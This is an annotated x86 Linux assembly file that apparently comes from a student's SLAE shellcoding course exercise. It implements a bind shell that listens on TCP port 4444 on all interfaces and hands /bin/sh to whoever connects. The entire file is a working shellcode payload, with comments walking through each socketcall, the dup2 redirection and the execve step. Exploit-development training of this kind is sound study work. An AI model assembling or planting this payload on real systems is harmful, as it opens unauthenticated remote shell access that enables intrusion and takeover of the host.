;Filename: bindShell.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 1

global _start

section .text

_start:
;First, we will need to create a socket		
;
;  socketcall(int call, socket(int domain, int type, int protocol)
;  eax:		ebx:    			ecx:
;  0x66		call = 0x1 (SYS_SOCKET)		*args = {domain = 0x2 (AF_INET), type = 0x1 (SOCK_STREAM), protocol = 0x0 (Single Protocol)}
;	
	xor ebx,ebx	; init register
	xor eax,eax
	xor edx,edx
	push ebx	; 0x0 for protocol
	inc ebx		
	push ebx	; 0x1 for SOCK_STREAM
	push byte +0x2	; 0x2 for AF_INET
	mov ecx,esp	; ecx points to addr of current stack
	mov al,0x66	; 0x66 systemcall for socketcall
	int 0x80
;Then we will need to set up bind() to assign address, listen() to listen for connection and accept() to accept connection
;
;  socketcall(int call, bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen))
;  eax:		ebx:				ecx:
;  0x66		call = 0x2 (SYS_BIND)		*args = {sockfd = eax, sockaddr = [0x2 (AF_INET), port = 115C (4444), address = 0x0], addrlen = 0x10}
;
	pop ebx
	pop esi
	push edx	; We just set our address to 0x0 so that it will accept all traffic.
			; You can also specify the address, e.g. 192.168.1.1 = C0.A8.01.01 = push dword 0101A8C0
	push word 0x5c11; 115c is 4444 in hexadecimal form
	push word 0x02	; value for AF_INET
	push byte +0x10
	push ecx	; push the address that store value of sockaddr to stack
	push eax	; eax was set to the value of sockfd after the socket call 
	mov ecx,esp	; ecx points to addr of current stack
	push byte +0x66 ; 0x66 systemcall for socketcall
	pop eax
	int 0x80
;
;  socketcall(int call, listen(int sockfd, int backlog))
;  eax:		ebx:				ecx:
;  0x66		call = 0x4 (SYS_LISTEN)		sockfd = eax
;
	mov [ecx+0x4],eax	; modify the the stack ecx is pointing to to sockfd
	mov bl,0x4		; socket call for listen
	mov al,0x66		; 0x66 systemcall for socketcall
	int 0x80
;
;  socketcall(int call, accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen))
;
	inc ebx			;increase ebx to 0x5 to call accept
	mov al,0x66		; 0x66 systemcall for socketcall
	int 0x80
;Now, its time for us to redirect all file descriptor we need so that our input and output to the shell 
;will be handled by stdin(0), stdout(1) and stderr(2)
;
;  dup2(int oldfd, int newfd, int flags)
;  eax:		ebx:			ecx:
;  0x3f		oldfd = sockfd		newfd = stdin(0), stdout(1) and stderr(2)
;
	xchg eax,ebx
	pop ecx
	mov cl, 0x2
loop:				; Since we got three fd, we will use loop 3 times
	mov al, 0x3f		; 0x3f systemcall for dup2
	int 0x80
	dec ecx			; 2 > 1 > 0
	jns loop
;At last, the final part, this one is rather easy as we only need to call /bin/sh with execve()
;
;  execve(const char *filename, char *const argv[],char *const envp[])
;  eax:		ebx:			ecx:			edx:
;  0xb		*filename = /bin//sh	address of /bin//sh	0x0
	push dword 0x68732f2f
	push dword 0x6e69622f	; /bin//sh
	mov ebx,esp
	push eax		; eax was set to 0x0 after dup2 and we can use it directly
	push ebx		
	mov ecx,esp
	mov al,0xb		; 0xb systemcall for execve
	int 0x80